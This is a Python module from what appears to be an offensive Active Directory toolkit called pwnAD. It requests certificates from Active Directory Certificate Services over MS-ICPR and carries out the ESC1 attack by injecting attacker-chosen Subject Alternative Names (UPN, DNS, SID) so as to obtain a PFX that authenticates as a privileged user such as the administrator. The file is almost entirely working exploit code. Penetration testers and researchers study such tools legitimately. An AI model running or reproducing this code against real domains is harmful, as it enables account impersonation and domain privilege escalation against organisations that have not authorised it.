"""
ADCS Certificate Request module for pwnAD.

Requests certificates from Active Directory Certificate Services via
the MS-ICPR RPC interface (ICertPassage::CertServerRequest).
Supports ESC1 exploitation via Subject Alternative Name abuse.
"""
import logging
import os

from impacket.dcerpc.v5 import transport, icpr
from impacket.dcerpc.v5.icpr import MSRPC_UUID_ICPR
from impacket.dcerpc.v5.nrpc import checkNullString

from pwnAD.lib.certificate import (
    create_csr, create_pfx, csr_to_der, der_to_cert,
    generate_rsa_key, rsa, x509,
)

CR_DISP_ISSUED = 3
CR_DISP_UNDER_SUBMISSION = 5


def _connect_to_ca(target, ca_host, auth_info):
    """Establish an RPC connection to the CA via \\pipe\\cert."""
    string_binding = rf'ncacn_np:{ca_host}[\pipe\cert]'
    rpc_transport = transport.DCERPCTransportFactory(string_binding)

    username = auth_info.get('username', '')
    password = auth_info.get('password', '')
    domain = auth_info.get('domain', '')
    lmhash = auth_info.get('lmhash', '')
    nthash = auth_info.get('nthash', '')
    aes_key = auth_info.get('aesKey', '')
    do_kerberos = auth_info.get('doKerberos', False)
    kdc_host = auth_info.get('kdcHost', None)

    rpc_transport.set_credentials(username, password, domain, lmhash, nthash, aes_key)
    if do_kerberos:
        rpc_transport.set_kerberos(True, kdcHost=kdc_host)

    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(MSRPC_UUID_ICPR)
    return dce


def _build_attributes(template, upn=None, dns=None, sid=None):
    """Build the attribute string for the cert request."""
    attrs = [f'CertificateTemplate:{template}']
    san_parts = []
    if upn:
        san_parts.append(f'upn={upn}')
    if dns:
        san_parts.append(f'dns={dns}')
    if sid:
        san_parts.append(f'url=tag:microsoft.com,2022-09-14:sid:{sid}')
    if san_parts:
        attrs.append('SAN:' + '&'.join(san_parts))
    return '\n'.join(attrs)


def request_certificate(
    conn,
    ca_name,
    template,
    ca_host=None,
    upn=None,
    dns=None,
    sid=None,
    subject=None,
    key_size=2048,
    output=None,
):
    """Request a certificate from an ADCS CA.

    Args:
        conn: LDAPConnection with valid credentials
        ca_name: Common name of the Certificate Authority
        template: Certificate template name
        ca_host: CA hostname (auto-resolved from LDAP if None)
        upn: UPN for SAN (ESC1 — e.g. administrator@domain.local)
        dns: DNS name for SAN
        sid: SID for SAN (ESC1 with strong cert mapping)
        subject: Custom subject DN (e.g. 'CN=Administrator')
        key_size: RSA key size (default 2048)
        output: Output path for .pfx (default: <user>.pfx)

    Returns:
        tuple: (pfx_path, cert, key) on success, raises on failure
    """
    from pwnAD.lib.adcs import get_enrollment_services, _extract_auth_info

    auth_info = _extract_auth_info(conn)
    if not auth_info:
        raise RuntimeError("Could not extract authentication info from connection")

    # Resolve CA hostname if not provided
    if not ca_host:
        cas = get_enrollment_services(conn, parse_sd=False)
        for ca in cas:
            if ca.name.lower() == ca_name.lower():
                ca_host = ca.dns_hostname
                break
        if not ca_host:
            raise RuntimeError(f"Could not find CA '{ca_name}' in LDAP. Use --ca-host to specify manually.")

    logging.info(f"[*] Connecting to CA '{ca_name}' on {ca_host}")

    # Generate key and CSR
    username = auth_info['username']
    csr, key = create_csr(
        username=username,
        alt_upn=upn.encode() if upn else None,
        alt_dns=dns.encode() if dns else None,
        alt_sid=sid if sid else None,
        key_size=key_size,
        subject=subject,
    )

    csr_der = csr_to_der(csr)

    # Build attributes
    attr_string = _build_attributes(template, upn=upn, dns=dns, sid=sid)
    logging.info(f"[*] Requesting certificate with template '{template}'")
    if upn:
        logging.info(f"[*] SAN UPN: {upn}")
    if dns:
        logging.info(f"[*] SAN DNS: {dns}")

    # Connect and send request
    dce = _connect_to_ca(conn.target, ca_host, auth_info)

    try:
        response = icpr.hCertServerRequest(
            dce,
            checkNullString(ca_name),
            csr_der,
            checkNullString(attr_string),
        )
    finally:
        dce.disconnect()

    disposition = response['pdwDisposition']
    request_id = response['pdwRequestId']

    if disposition == CR_DISP_ISSUED:
        logging.info(f"[+] Certificate issued! (Request ID: {request_id})")

        cert_der = response['pctbEncodedCert']['pb']
        cert = der_to_cert(bytes(cert_der))
        pfx = create_pfx(key, cert)

        if output is None:
            target_name = upn.split('@')[0] if upn else (dns or username)
            output = f'{target_name}.pfx'

        with open(output, 'wb') as f:
            f.write(pfx)

        logging.info(f"[+] PFX saved to: {output}")
        logging.info(f"[*] Use with: pwnAD -pfx {output} ...")

        return output, cert, key

    elif disposition == CR_DISP_UNDER_SUBMISSION:
        logging.warning(f"[*] Certificate request is pending (Request ID: {request_id})")
        logging.warning("[*] CA manager approval required. Retrieve later with the request ID.")
        raise RuntimeError(f"Certificate pending approval (Request ID: {request_id})")

    else:
        # Error — decode disposition message
        disp_msg_raw = response['pctbDispositionMessage']['pb']
        if disp_msg_raw:
            disp_msg = bytes(disp_msg_raw).decode('utf-16-le', errors='replace').strip('\x00')
        else:
            disp_msg = f"Unknown error (disposition: {disposition})"
        raise RuntimeError(f"Certificate request denied: {disp_msg}")
